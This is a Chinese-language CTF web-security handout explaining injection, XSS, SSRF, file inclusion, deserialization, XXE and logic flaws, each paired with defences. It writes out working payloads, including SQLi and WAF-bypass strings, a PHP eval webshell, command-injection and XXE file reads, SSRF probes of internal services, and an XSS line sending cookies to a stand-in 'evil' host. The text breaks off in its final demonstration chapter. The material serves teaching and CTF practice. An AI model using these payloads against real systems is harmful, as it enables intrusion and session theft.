导读：这份讲义怎么用

这不是一本让你背的书，而是一张地图。每一章都按"是什么 → 为什么 → 怎么利用 → 怎么防御"四步讲。你不需要一次读完，建议按顺序推进，每学一章就去靶场做一道对应类型的题。

三条贯穿全书的主线

  1. 数据流思维：任何漏洞，本质都是"用户输入的数据，流到了一个不该去的地方，或被以不该有的方式解释"。学会追踪数据在程序里怎么流动、被谁解释，你就抓住了安全的核心。
  2. 上下文思维：同一段字符，在 HTML 里、SQL 里、命令行里、文件路径里含义完全不同。漏洞常常发生在"数据从一个上下文进入另一个上下文时没被正确处理"。
  3. 信任边界思维：程序里每一处"相信了不可信输入"的地方，都是潜在漏洞。永远不要相信来自浏览器的数据。

Web 安全知识地图

① 基础层HTTP 协议 · Web 工作原理 · 开发工具 · HTML/JS/PHP/SQL 语法
② 注入类SQL 注入 · 命令注入 · 代码执行 · XXE · SSTI
③ 前端类XSS · CSRF · 点击劫持 · DOM 型漏洞
④ 服务端类文件包含 · 文件上传 · SSRF · 反序列化 · 逻辑漏洞
⑤ 方法论信息收集 · 代码审计 · payload 构造 · 过滤绕过
⑥ 防御视角参数化查询 · 输出编码 · 最小权限 · 安全配置
给你的一句话定位 你现在是第 ① 层往第 ② ③ 层过渡的阶段。先把基础打牢，再一类一类啃漏洞。每一类漏洞都要做到"能讲清原理、能手工利用、能写出防御"这三个层次。

第 1 章Web 是怎么工作的

想攻击 Web，先得懂 Web 正常是怎么运转的。这一章把"从输入网址到看到页面"的全过程拆开。

1.1 从输入网址到看到页面

1. 你在浏览器输入 https://example.com/index.php 2. DNS 解析：把域名 example.com 翻译成服务器的 IP 地址 3. 建立连接：客户端与服务器完成 TCP 三次握手（HTTPS 还要 TLS 握手） 4. 发送请求：浏览器发出一个 HTTP 请求报文 5. 服务器处理：Web 服务器（如 Nginx）+ 应用（如 PHP）执行程序、查数据库 6. 返回响应：服务器发回 HTTP 响应报文，里面是 HTML 7. 浏览器渲染：解析 HTML/CSS/JS，画出你看到的页面

安全漏洞可以出现在链条的任何一环：DNS 劫持、中间人攻击（第 2-4 步）、服务端漏洞（第 5 步）、XSS（第 7 步）。Web 方向主要聚焦第 5、7 步。

1.2 HTTP 请求报文长什么样

你在浏览器按 F12 → Network，点任意一个请求，就能看到真实报文。一个 GET 请求：

GET /index.php?id=1 HTTP/1.1          ← 请求行：方法 路径 协议版本
Host: example.com                       ← 请求头（Header）
User-Agent: Mozilla/5.0 ...
Cookie: PHPSESSID=abc123               ← 携带的身份凭证
Accept: text/html,...
                                        ← 空行之后是请求体（GET 一般为空）

一个 POST 请求会把数据放在请求体里：

POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=123456      ← 请求体（表单数据）

1.3 HTTP 响应报文

HTTP/1.1 200 OK                          ← 状态码
Content-Type: text/html; charset=utf-8
Set-Cookie: session=xyz; HttpOnly        ← 服务器给浏览器种 Cookie
Server: nginx

<html>...</html>                        ← 响应体（网页内容）

1.4 必须记住的状态码

类别常见码含义
2xx 成功200请求成功
3xx 重定向301 / 302永久 / 临时跳转。CTF 中常藏线索在跳转前的响应里
4xx 客户端错误403禁止访问（有文件但没权限）
404找不到（文件不存在）
5xx 服务端错误500服务器内部出错——注入点常常靠它暴露

1.5 请求方法

GET（取数据，参数在 URL）、POST（提交数据，参数在请求体）最常用。还有 PUT、DELETE、HEAD、OPTIONS 等。CTF 有时会考"换方法绕过限制"。PHP 里 $_REQUEST 能同时接收 GET 和 POST 参数，这就是上一份笔记那道题能用 ?file= 的原因。

1.6 Cookie 与 Session：HTTP 怎么"记住你"

HTTP 本身是无状态的——服务器默认不记得你是谁。于是有了：

  • Cookie：服务器通过 Set-Cookie 给浏览器一小段数据，浏览器之后每次请求都自动带上。
  • Session：服务器为每个用户保存一份状态，只把"会话 ID"（session id）通过 Cookie 发给浏览器。
安全关联 登录凭证存在 Cookie/Session 里，所以：XSS 偷 Cookie、CSRF 冒用 Cookie、Session 固定/劫持，都是围绕它展开的攻击。响应头里的 HttpOnly 能阻止 JS 读取 Cookie，是防 XSS 窃取的重要措施。

1.7 HTTPS 简述

HTTPS = HTTP + TLS 加密。它解决的是"传输过程被窃听/篡改"的问题，但并不能修复应用本身的漏洞——一个用了 HTTPS 的网站照样可能有 SQL 注入、XSS。别把"小锁图标"当成安全保证。

第 2 章必备工具箱

工欲善其事，必先利其器。这几个工具你现在就该装好、会用。

2.1 浏览器开发者工具（F12）

  • Elements：看/改网页 HTML 和 CSS，找隐藏元素和注释。
  • Network（网络）：看所有请求响应报文、状态码、参数——Web 安全最高频的面板。
  • Console（控制台）：执行 JS，测试 XSS payload 就在这里。
  • Application：看 Cookie、LocalStorage。

2.2 Burp Suite（Web 安全第一神器）

一个"中间人代理"：浏览器所有流量先经过它，你能拦截、查看、任意修改每一个请求再放行。核心模块：

模块作用
Proxy抓包、改包。拦截开关 Intercept is on/off
Repeater手动重放单个请求，反复改参数测试——最常用
Intruder自动化批量发请求（爆破、fuzz）
Decoder编码/解码（URL、Base64、Hex）
上手建议 装好 Burp + 浏览器代理插件（如 FoxyProxy），把流量代理到 127.0.0.1:8080，装好 CA 证书解决 HTTPS 提示。先练熟 Proxy 抓包和 Repeater 改参数，这两个够你应付大半 CTF Web 题。

2.3 curl（命令行发请求）

不用开浏览器就能发请求，写脚本、批量测试很方便。常用：

curl -i URL                      # 显示响应头+响应体
curl -X POST -d "a=1&b=2" URL        # 发 POST 请求
curl -b "cookie=xxx" URL           # 带 Cookie
curl --path-as-is URL              # 不自动规范化 ../ 路径（测目录穿越用）

2.4 Linux 虚拟机

用 VirtualBox/VMware 装一个 Kali Linux 或 Ubuntu。很多工具（sqlmap、nmap、dirsearch）在 Linux 下最好用，靶场也常是 Linux 环境，熟悉基本命令（cd ls cat pwd grep find chmod）是必备。

2.5 其他会陆续用到的

sqlmap（自动化 SQL 注入）、dirsearch（目录扫描）、nmap（端口扫描）、Wappalyzer（识别网站技术栈）、在线编码解码工具。这些东西先知道名字，用到时再学。

第 3 章Web 开发基础

你不用成为开发高手，但要能读懂代码、知道正常写法长什么样，才认得出"不正常的写法"就是漏洞。

3.1 HTML 与 JavaScript essentials

  • HTML 用标签描述页面结构：<div>、<input>、<script>、<img>。
  • JS 让页面能动：document.getElementById()、innerHTML、eval()、事件 onerror/onclick。
  • 注意：把用户输入拼进 innerHTML 或 eval，就是 XSS 的温床。

3.2 PHP 核心（CTF Web 半壁江山）

PHP 是最常见的 CTF Web 后端语言，重点掌握：

<?php
$name = $_GET['n'] ?? 'guest';   // 超全局变量接收 URL 参数
$arr  = ['a'=>1, 'b'=>2];            // 数组
if ($name === 'admin') { echo "hi"; }      // 条件判断
include "header.php";                        // 文件包含
echo file_get_contents("/etc/passwd");           // 读文件
?>

超全局变量：$_GET、$_POST、$_REQUEST（两者皆含）、$_COOKIE、$_SERVER、$_FILES。它们全部来自用户，全部不可信。

3.3 SQL 基础

数据库用来存数据，Web 程序靠 SQL 语句增删改查。最核心的查询：

SELECT username, password FROM users WHERE id = 1;
SELECT * FROM users UNION SELECT 1,2,3;   -- 联合查询（注入常用）

记住 SELECT ... FROM ... WHERE ...、UNION、ORDER BY、注释符 -- 和 #。后面 SQL 注入全靠这些。

3.4 数据是怎么在前后端流动的

用户在表单输入 → 浏览器发 HTTP 请求（参数）→ 后端 PHP 用 $_GET/$_POST 取出 → 拼进 SQL 语句查数据库 / 拼进 HTML 返回 / 拼进文件路径 / 拼进系统命令 → 结果返回浏览器显示
全书的"万能公式" 上面这条链里，"拼进"的四个去向，正好对应四大类漏洞：拼进 SQL → SQL 注入；拼进 HTML → XSS；拼进文件路径 → 文件包含/读取；拼进系统命令 → 命令注入。你现在就把这个对应关系刻进脑子，后面每一章都是在展开它。

第 4 章SQL 注入（SQLi）

最经典、危害最大、CTF 出现率最高的漏洞之一。本质：用户输入被拼进 SQL 语句，改变了语句原本的逻辑。

4.1 漏洞是怎么产生的

看一段有问题的后端代码：

// 后端 PHP
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = " . $id;   // 直接拼接！
$result = mysqli_query($conn, $sql);

正常访问 ?id=1，SQL 是 ... WHERE id = 1。但攻击者传 ?id=1 OR 1=1，SQL 变成：

SELECT * FROM users WHERE id = 1 OR 1=1;   -- 恒真，返回所有用户！

用户的输入"逃逸"出了原本的数据位置，变成了 SQL 代码的一部分。这就是注入。

4.2 怎么判断一个地方有没有注入

  1. 找带参数的地方：?id=、?username=、搜索框、登录框等。
  2. 加单引号 '：如果页面报错或异常（SQL 语法错误），大概率有注入。
  3. 经典测试：?id=1' and 1=1--+ 页面正常；?id=1' and 1=2--+ 页面异常 → 确认注入存在。
--+ 是什么 --+ 是 SQL 注释符 -- 加一个 +（+ 在 URL 里会被解码成空格，让注释生效），作用是把原 SQL 后面剩下的内容注释掉。MySQL 里也可用 #。

4.3 注入的三大目标与手法

① 联合查询注入（union）—— 最直接

先猜列数（ORDER BY 1,2,3... 直到报错），再用 union 拼出想要的数据：

?id=1' ORDER BY 3--+                        # 探测列数
?id=-1' UNION SELECT 1,2,3--+               # 让前面查不到，显示 union 的结果
?id=-1' UNION SELECT 1,database(),version()--+  # 爆库名、版本
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+  # 爆表名

information_schema 是 MySQL 自带的信息库，存着所有库名、表名、列名——注入的"地图"。

② 盲注 —— 页面不回显数据时

如果页面不显示查询结果，只能靠"真/假"或"时间差"一点一点猜：

  • 布尔盲注：?id=1' and ascii(substr(database(),1,1))>100--+，看页面真假判断字符。
  • 时间盲注：?id=1' and if(ascii(substr(database(),1,1))>100,sleep(5),0)--+，靠响应是否延迟判断。

③ 报错注入 —— 让错误信息带出数据

?id=1' and updatexml(1,concat(0x7e,database()),1)--+

故意制造报错，把想查的数据塞进错误信息里显示出来。

4.4 常见绕过（当关键词被过滤）

  • 注释/大小写混淆：un/**/ion、UnIoN
  • 编码：%75nion（URL 编码）、十六进制
  • 等价替换：and → &&，or → ||，空格 → %20//**/
  • 双写绕过：selselectect（过滤掉一个 select 后剩下 select）

4.5 防御（必须能说出来）

根治方法：参数化查询 / 预编译 把 SQL 语句和数据分开传，数据永远只当数据，不参与语句拼装： 
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
辅助手段：输入类型校验、最小数据库权限、关闭详细报错回显、WAF。

第 5 章XSS 跨站脚本（Cross-Site Scripting）

本质：用户输入被当成 HTML/JS 代码，在别人的浏览器里执行了。注意它攻击的是"其他访问者"，不是服务器。

5.1 一个最小例子

假如网站把搜索关键词直接显示出来：

// PHP：把用户输入原样输出到页面
echo "搜索结果：" . $_GET['q'];

攻击者构造链接 ?q=<script>alert(1)</script>，诱使别人点击，对方的浏览器就会弹出 alert——证明 JS 被执行了。真实攻击里 alert 会换成窃取 Cookie 的脚本。

5.2 三种类型（必考）

类型特点场景
反射型payload 在 URL 里，服务器"反射"回来，一次性诱导点击恶意链接
存储型payload 存进数据库，每次访问都触发，危害最大评论区、留言板、昵称
DOM 型纯前端 JS 处理 URL 时不安全，不经过服务器前端用了 innerHTML/document.write

5.3 常用 payload（理解原理，不要死记）

<script>alert(1)</script>
<img src=x onerror=alert(1)>              # 图不存在触发 onerror
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>
'><img src=x onerror=alert(1)>            # 需要闭合属性/标签时
<img src=x onerror="fetch('//evil/'+document.cookie)">  # 偷 Cookie

5.4 绕过过滤的思路

  • 关键字被过滤：大小写混写、双写、编码（HTML 实体、JS 编码）。
  • 事件绕过：不用 <script>，改用 onerror、onload 等事件属性。
  • 闭合绕过：先试探输入点被放在标签的哪个位置（属性内？标签间？注释里？），再决定怎么闭合逃逸。

5.5 防御

核心：输出编码 + 上下文感知
  • 把用户输入输出到 HTML 时做转义：htmlspecialchars()（把 < 变 &lt;），让它只当文本显示。
  • 输出到 JS / URL / 属性要用对应规则的编码，不能一律 htmlspecialchars。
  • Cookie 加 HttpOnly，让 JS 读不到，即使有 XSS 也偷不到会话。
  • 部署 CSP（内容安全策略），限制能执行的脚本来源。

第 6 章CSRF 与 SSRF

这两个名字很像，方向却相反：CSRF 借用户的浏览器发请求，SSRF 借服务器发请求。

6.1 CSRF（跨站请求伪造）

原理：浏览器发请求时会自动带上 Cookie。如果我诱导已登录的用户访问一个恶意页面，这个页面能悄悄以他的身份向目标网站发请求（比如转账、改密码），而网站分不清是不是本人操作。

用户已登录 bank.com（浏览器存着 Cookie） ↓ 访问了 evil.com 的恶意页面 evil.com 页面自动提交一个表单 → POST bank.com/transfer?to=黑客&money=10000 ↓ 浏览器自动带上 bank.com 的 Cookie bank.com 以为是本人操作 → 转账成功 😱

防御：

  • 关键操作加 CSRF Token：服务器生成随机令牌放表单里，提交时校验，恶意站点拿不到。
  • Cookie 设 SameSite=Lax/Strict，阻止跨站请求携带 Cookie。
  • 重要操作二次验证（密码、验证码）。
  • 检查 Referer/Origin 来源。

6.2 SSRF（服务端请求伪造）

原理：服务器提供"根据 URL 拉取内容"的功能（如图片抓取、网址预览），但没限制目标。攻击者把 URL 指向服务器内网或本机，让服务器去请求，从而探测内网、读取本地文件、攻击内网服务。

# 正常功能：?url=https://example.com/pic.jpg 服务器去取图
# 攻击：让服务器请求自己的内网管理接口或本地文件
?url=file:///etc/passwd                       # 读本地文件
?url=http://127.0.0.1:6379/                   # 探测本机 Redis
?url=http://192.168.1.1/admin                 # 访问内网路由器管理页
?url=gopher://127.0.0.1:6379/_...             # gopher 协议打内网服务（进阶）

常见协议：file://（读文件）、gopher://（构造任意 TCP 请求，威力大）、dict://、http://。

防御：目标 URL 白名单；禁止私网 IP（127.0.0.1、10.x、192.168.x 等）；禁用危险协议；统一走代理并限制出网。

第 7 章文件上传与文件包含

这两个经常配合出击：文件上传是把恶意文件送上去，文件包含是让服务器把它执行/读出来。你上次解的那道 WarmUp 就是文件包含。

7.1 文件上传漏洞

原理：网站允许上传文件，但没严格校验类型/内容。攻击者上传一个"木马"文件（如 PHP 一句话木马），再访问它，就能执行任意命令。

// 一句话木马（shell.php）
<?php eval($_POST['cmd']); ?>
// 上传后用蚁剑/菜刀连接，或 curl 提交：cmd=phpinfo();

常见校验与绕过：

校验方式绕过思路
前端 JS 校验扩展名直接改包/关 JS，前端校验形同虚设
检查 Content-TypeBurp 改包把 image/jpeg 改成允许值
黑名单扩展名用 .php5 .phtml .Php、双后缀 .jpg.php、.htaccess
检查文件头图片马：在真实图片后追加 PHP 代码（配合文件包含利用）
%00 截断老版本 PHP：shell.php%00.jpg

防御：白名单扩展名；重命名文件为随机名；上传目录禁止执行权限；检测文件内容；隔离存储。

7.2 文件包含漏洞（你做过的那道）

原理：include/require 的文件名来自用户输入且未严格校验，导致能读/执行任意文件。回顾你解过的源码：

$whitelist = ["source"=>"source.php", "hint"=>"hint.php"];
$_page = mb_substr($page,0,mb_strpos($page.'?','?')); // 只截取 ? 前面校验
if (in_array($_page,$whitelist)) return true;
...
include $_REQUEST['file'];   // 却用了原始完整串 → 错位！

核心矛盾（你已经掌握）：安检看的字符串 ≠ 实际执行的字符串。用 source.php?../../../../ffffllllaaaagggg 骗过白名单，include 却拿着完整串做了目录穿越。

本地包含 LFI vs 远程包含 RFI

  • LFI（Local）：包含服务器本地文件，如 /etc/passwd、日志文件。
  • RFI（Remote）：当 allow_url_include=On，可包含远程 URL 上的木马，危害更大。

PHP 伪协议（文件包含的神器，必须掌握）

伪协议用途
php://filter/read=convert.base64-encode/resource=xx.php读取 PHP 源码（Base64 编码输出，绕过执行）——CTF 超高频
php://input把 POST 请求体当 PHP 代码执行（需 allow_url_include）
data://text/plain,<?php...?>直接在 URL 里写 PHP 代码执行
file://读本地绝对路径文件
phar://配合 phar 反序列化（进阶）
# 经典：读 flag.php 的源码（不执行，而是 base64 吐出来）
?file=php://filter/read=convert.base64-encode/resource=flag.php
# 拿到 base64 后解码即得源码里的 flag

防御：不允许用户控制 include 路径；用固定映射代替拼接；用 realpath() 校验真实路径是否在允许目录内；关闭 allow_url_include。

第 8 章命令注入与代码执行

8.1 命令注入（Command Injection）

原理：Web 程序调用了系统命令，并把用户输入拼进去。攻击者用命令分隔符追加自己的命令。

// PHP 有问题的代码：ping 用户输入的 IP
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);

传 ?ip=127.0.0.1;cat /flag，实际执行的就是两条命令，flag 被打印出来。

常见命令分隔符：

;      # 顺序执行（最常用）
&&     # 前一个成功才执行后一个
||     # 前一个失败才执行后一个
|      # 管道，把前一个输出交给后一个
\n     # 换行（URL 编码 %0a）
$(...) 或 `...`  # 命令替换

空格被过滤的绕过：${IFS}、%09（Tab）、<、{cat,/flag}。

防御：不要用用户输入拼命令；用白名单校验；用 escapeshellarg()/escapeshellcmd() 转义；尽量避免调用系统命令。

8.2 代码执行（RCE）

比命令注入更直接：用户输入被当成程序代码执行。常见危险函数：

  • PHP：eval()、assert()、preg_replace() 的 /e 模式、create_function()。
  • 典型一句话木马 <?php eval($_POST['cmd']);?> 就是靠 eval 执行任意 PHP。
命令注入 vs 代码执行 前者执行的是操作系统命令（cat、ls），后者执行的是编程语言代码（PHP、Python）。口试选择题爱考这个区别。
回到顶部

第 9 章反序列化漏洞

这是进阶内容，新手可以先理解概念，回头再啃。本质：程序把用户可控的数据反序列化成对象，触发了对象里的危险代码。

9.1 序列化与反序列化是什么

序列化 = 把对象变成一串可存储/传输的字符串；反序列化 = 把这串字符串还原成对象。PHP 用 serialize() / unserialize()。

<?php
class User {
    public $name = 'guest';
    function __destruct() { system($this->name); }  # 对象销毁时执行命令
}
// serialize(new User()) → O:4:"User":1:{s:4:"name";s:5:"guest";}
// 攻击者把 name 改成 "cat /flag"，程序 unserialize 后对象销毁触发 __destruct 执行命令
?>

9.2 为什么会出问题

PHP 有一批"魔术方法"（__destruct、__wakeup、__toString、__construct 等），会在特定时刻自动调用。如果攻击者能控制被反序列化的对象的属性，就能让自动调用的方法执行危险操作。

  • POP 链：当直接没有危险方法时，把多个类的方法串联起来达成目的，像搭链条一样，叫 Property-Oriented Programming 链。
  • phar 反序列化：即使用不了 unserialize()，通过 phar:// 协议读取特制 phar 文件也能触发反序列化，是常见绕过。

9.3 其他语言的反序列化

Java（ObjectInputStream、 CommonsCollections 等 gadget 链）、Python（pickle.loads）、.NET 都有同类问题。 一旦发现反序列化点，常用工具 ysoserial（Java）、phpggc（PHP）生成 payload。

防御：尽量不要反序列化不可信数据；用 JSON 等安全格式代替；白名单校验要反序列化的类；升级有漏洞的库。

回到顶部

第 10 章XXE 与模板注入（SSTI）

10.1 XXE（XML 外部实体注入）

原理：程序解析用户提交的 XML，而 XML 允许定义"外部实体"引用外部资源。攻击者借此读文件、探测内网、造成拒绝服务。

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>    # &xxe; 处会替换成 /etc/passwd 的内容

危害：任意文件读取、SSRF（用 http:// 实体）、盲 XXE、DoS（ billion laughs 攻击）。

防御：禁用外部实体解析（PHP 用 libxml_disable_entity_loader(true)）；升级 XML 解析库；尽量不用 XML 处理不可信输入。

10.2 SSTI（服务端模板注入）

原理：模板引擎（Jinja2、Twig、Smarty 等）把用户输入拼进模板一起解析，导致用户能用模板语法执行代码。判断是否 SSTI 的经典测试：

输入 ${7*7} 或 {{7*7}} 或 <%= 7*7 %>   # 如果页面显示 49 → 存在 SSTI

确认后利用模板的"沙箱逃逸"执行系统命令（如 Jinja2 通过 __class__.__mro__ 找到 subprocess.Popen）。这是 CTF 里较难的题型，工具 fenjing 可辅助。

防御：不要把用户输入当模板内容；模板与数据分离；使用模板引擎自带的沙箱并限制可用对象。

第 11 章逻辑漏洞与认证缺陷

这类漏洞不靠"注入代码"，而是利用业务流程设计上的疏忽——往往自动化工具扫不出来，靠人的思维。

11.1 越权访问

  • 水平越权：改成别人的 ID 就能看/改同等级用户的数据（如 ?user_id=123 改成 124）。
  • 垂直越权：普通用户能访问管理员功能（如直接访问 /admin 页面）。

本质：服务器只验证了"你登录了"，没验证"你有没有权限操作这个资源"。

11.2 未授权访问

某些接口/后台不需要登录就能访问。比如直接访问管理页面、Swagger 文档、Actuator 端点、开放的 Redis/Docker API。

11.3 认证与会话缺陷

  • 弱口令、默认口令（admin/admin）。
  • 验证码可绕过：前端校验、验证码不刷新、可复用、可识别。
  • Session 固定：登录前后 session id 不变，可被劫持。
  • JWT 缺陷：不校验签名、alg:none 攻击、弱密钥可爆破。

11.4 业务逻辑漏洞

  • 支付：负数金额、改价格参数、重复提交订单、优惠券叠加。
  • 抽奖/积分：并发请求、重放数据包。
  • 密码找回：验证码爆破、改接收手机号、逻辑绕过直接重置他人密码。
CTF 里的常见考法 逻辑题常考"改包"：用 Burp 抓下关键请求，逐一修改每个参数观察反应，理解服务端逻辑后找到绕过点。把每一个参数都当成可疑对象去试，是逻辑题的基本功。

防御：每个请求都做服务端权限校验（永远不要信前端）；关键业务加服务端状态校验；敏感操作二次确认；做好会话管理。

回到顶部

第 12 章其他常见漏洞

12.1 目录穿越（Directory Traversal）

用 ../ 跳出预期目录读文件：?file=../../../../etc/passwd。常与文件下载、文件包含结合。防御：校验路径规范化后必须在允许目录内。

12.2 任意文件读取 / 下载

提供"下载文件"功能的接口，文件名参数可控且未校验：?filename=../../etc/passwd。防御：白名单 + 固定目录映射。

12.3 条件竞争（Race Condition）

利用多线程/并发，在"检查"和"使用"之间的时间差做手脚。经典场景：文件上传后、删除前的短暂窗口内访问文件；转账的并发重放。防御：加锁、原子操作。

12.4 信息泄露

各种"不该露出来却露了"的东西：

  • 源代码里的注释、硬编码的密码和密钥（你第一道题就是靠注释找到线索的）。
  • .git、.svn 版本控制目录泄露（可用 githack 恢复源码）。
  • 备份文件：index.php.bak、.swp、www.zip。
  • 报错信息暴露路径、版本、SQL 语句。
  • 目录列表开启、robots.txt 泄露敏感路径。

12.5 HTTP 相关

  • HTTP 请求走私：利用前后服务器对请求边界理解不一致（Content-Length vs Transfer-Encoding）。
  • Host 头攻击：篡改 Host 头影响密码重置链接、缓存投毒。
  • CORS 配置错误：允许任意来源读取敏感数据。

第 13 章CTF Web 通用解题流程

把前面所有知识串成一套可复用的动作清单。拿到任何一道 Web 题，按这个顺序走。

① 信息收集 - 打开页面，看源码（Ctrl+U）：注释、隐藏表单、JS 里的接口 - F12 看网络请求、响应头 - 扫目录（dirsearch）：找备份、.git、后台、其他页面 - 识别技术栈（Wappalyzer）：PHP？Java？什么框架？ ↓ ② 找入口 - 所有能传参的地方：URL 参数、表单、Cookie、HTTP 头、上传点 - 判断数据流：参数进了 SQL？HTML？文件路径？命令？模板？ ↓ ③ 判断漏洞类型 - 加引号看报错 → 疑似 SQL 注入 - 输出被回显到页面 → 疑似 XSS/SSTI - 有文件读取/包含功能 → 疑似 LFI/任意文件读 - 有 ping/查询功能 → 疑似命令注入 ↓ ④ 构造 payload 验证并利用 - 由简到繁：先证明漏洞存在（弹窗/报错/延迟），再扩大战果 ↓ ⑤ 拿 flag 并提交

几条实战心法

  • 先看懂程序在干什么，再动手。盲目 fuzz 效率低，代码审计（有源码时）往往一眼看穿。
  • 区分"过滤了什么"和"没过滤什么"。用二分思路测试：一个一个字符试，看哪些被拦截。
  • 善用报错。SQL 报错、PHP warning 会泄露大量信息。
  • 不要爆破 flag。拿 flag 靠的是逻辑漏洞和巧解，不是枚举字符——这也是你一开始就定的规矩，很好。

第 14 章PHP 特性与绕过技巧合集

CTF Web 有大量"考语言特性"的题，这些是高频考点，集中放在这里当工具箱查。

14.1 弱类型比较

  • == 弱比较会类型转换，=== 严格比较才安全。
  • "0e123" == "0e456" 为 true——两边都被当成科学计数法的数字 0（MD5 值以 0e 开头经常用这个绕过）。
  • 1 == "1abc" 在 PHP5 为 true，PHP7 起为 false（版本差异要看环境，本题是 PHP5.6）。
  • null == false == 0 == "" == [] 都为真，绕过判断时有用。

14.2 常见函数陷阱

  • in_array($x, $arr) 不传第三个 true 时是弱比较，可被类型转换绕过。
  • strcmp($a, $b) 传数组时返回 NULL，NULL == 0 可绕过 strcmp(...)==0。
  • md5($a) == md5($b) 用两个 MD5 后以 0e 开头的字符串（如 QNKCDZO 与 240610708）。
  • is_numeric() 对 %00、科学计数法的处理差异。
  • preg_replace() 的 /e 模式会把替换串当代码执行（PHP5）。

14.3 变量覆盖与提取

  • extract($_GET) 可把 URL 参数直接变成变量，覆盖已有变量。
  • parse_str()、$$（可变变量）也都可能造成变量覆盖。

14.4 绕过小结

场景技巧
数字比较绕过数组、0e 科学计数法、小数点、正负号
字符串黑名单大小写、双写、注释分割、编码、等价函数
正则匹配换行绕过 ^$、%00 截断、回溯溢出
过滤空格${IFS}、%09、/**/、%0a

第 15 章WAF 绕过与过滤规避思路

当程序或 WAF 过滤了你的 payload，别慌，按下面的思路系统性地试。

  1. 先探测规则：逐个提交关键字/字符，看哪个被拦、怎么拦（返回 403 还是被清洗）。
  2. 变换大小写：SELECT → SeLeCt。
  3. 注释插入：un/**/ion、sel/**/ect。
  4. 编码：URL 编码、双重编码、十六进制、Unicode、HTML 实体。
  5. 双写：过滤一次 select 就写 selselectect。
  6. 等价替换：and↔&&，substr↔mid，sleep↔benchmark。
  7. 特殊字符/换行：%0a、%00、制表符、注释符。
  8. HTTP 参数污染（HPP）：同名参数传多次，前后 WAF 与应用取的可能是不同的值。
  9. 分块传输：用 Transfer-Encoding: chunked 绕过某些 WAF 的检测。
心态 绕过是"侦察 → 假设 → 验证"的循环，不是玄学。每次只改变一个变量，你才能知道是哪个技巧起了作用。

第 16 章Web 解题的六种思维引擎

前面十几章给了你"武器库"，但真正决定你能不能做出一道新题的，是拿到题时脑子里怎么转。这一章讲六种高手常用的思维引擎——遇到 Web 题时，它们会轮流启动，帮你把题从"看不懂"变成"一步步拆开"。

引擎① 目标倒推：从 flag 往回走

新手习惯从页面顺着往下做；高手常反过来想：flag 最终会出现在哪？谁有权读到它？我要构造什么输入才能让程序走到那一步？从终点往回铺路，目标清晰，不瞎忙。

终点：flag 显示在页面 / 写进文件 / 作为响应返回 ← 谁有权读它？（某个函数、参数、用户身份） ← 怎么让程序走到那一步？（构造什么输入） ← 现在手里有什么线索？

你做过的 WarmUp 题就用到了它：hint.php 说"flag 在 ffffllllaaaagggg 里"——终点明确了，于是你知道目标是构造一个"能读到那个文件"的输入。倒推把模糊的任务变成清晰的方向。

引擎② 缩小战场：把大题切成一串小题

一道题看起来难，是因为你把"拿下 flag"当成一个整体。高手的做法是不断切片，每一步只解决一个小问题：

  1. "我先不急着拿 flag，先确认这里到底有没有注入。"
  2. "确认有注入，我先搞清楚是字符型还是数字型。"
  3. "再定位哪一列能回显，然后才谈读数据。"
  4. "能读数据了，最后找 flag 在哪张表哪个字段。"

复杂问题不是被一次性解决的，而是被切成一串简单问题逐个吃掉的。每解决一个，未知就少一个。

引擎③ 类比迁移：这题像我做过的哪道

高手脑子里有个"题型库"，看到新题先检索："这个现象和我做过的哪道题像？像在哪、不像在哪？"

关键迁移的是思路结构，不是照搬 payload。比如你做过"问号截断的文件包含"，再遇到一道"参数被拼进路径"的题，就算表面不同，你也会想到"检查的和执行的是不是同一个值"——这就是把结构迁移过去，而不是死记一串字符。

引擎④ 假设树：同时挂多个可能，用一次实验砍一片

新手容易认定一个方向死磕；高手脑里是一棵树，用一个信息量最大的实验，一次排除多个分支。

现象：参数 id 可疑 ├─ 假设 A：数字型注入 → 试 id=1 and 1=2 ├─ 假设 B：字符型注入 → 试 id=1' and '1'='2 ├─ 假设 C：无注入/被参数化 → 试 id=abc 看是否报错 └─ 一个结果明确的实验，可同时排除多个分支

技巧：优先做那些"不管结果如何都能排除好几个假设"的实验，而不是只验证单一猜想的实验。比如 ?id=2-1 一次就区分了"数字型/字符型"，比直接打一堆引号高效得多。

引擎⑤ 反证证伪：主动找自己的错

人天生爱"证实"——找到支持自己的证据就停工。高手反过来证伪："如果我判断错了，应该看到什么？我去看那个现象了吗？"

自检三问① 有没有另一种解释也能说明我看到的？② 我是不是只挑了支持自己的证据？③ 什么现象会让我承认自己错了？
这一条专门对抗"我觉得过滤挺严"这类没验证就当成事实的思维定势。

引擎⑥ 转换视角：换身份看同一道题

卡住时强制换一个身份：

  • 出题人视角：他想考什么？给这个提示是想引导我往哪走？
  • 开发者视角：如果我写这功能，哪里最可能偷懒没检查？
  • 攻击者视角：这数据若被我完全控制，最坏能让它干什么？
  • 正常用户视角：正常操作是怎样的？我偏离一步会怎样？

视角一换，常能看到之前视而不见的东西——它改变的是你"关注什么"。

六种引擎怎么配合

场景优先调用的引擎
刚开始、一头雾水目标倒推 + 观察（先搞清终点和起点）
问题看着很复杂缩小战场（切片成小问题）
有几个可能方向假设树 + 类比迁移（挂树、找像的题）
自以为想通了反证证伪（主动找漏洞）
彻底卡住转换视角（换身份看）
元认知还要跳出来盯住自己：你现在处在"收集信息 / 假设验证 / 卡住"哪种状态？很多人卡了几小时都不知道自己在"卡住态"，还在假装验证里重复劳动。能诚实贴上"我卡住了"的标签，就是破局的第一步。

第 17 章Web 实战逐帧演示（含走弯路）

前面都是道理。这一章把"高手怎么想"演给你看——每一帧写清：眼睛看到什么、脑子里冒出什么念头、手做了什么、为什么选这条路。特意保留了走弯路的帧，因为真实解题就是会犯错，关键是怎么把自己救出来。

演示一：一道 SQL 注入题的完整思路

题目：新闻页 ?id=1 显示一篇新闻，目标是拿 flag。

第 1 帧 · 观察

看到：?id=1，页面显示"第 1 篇新闻"。

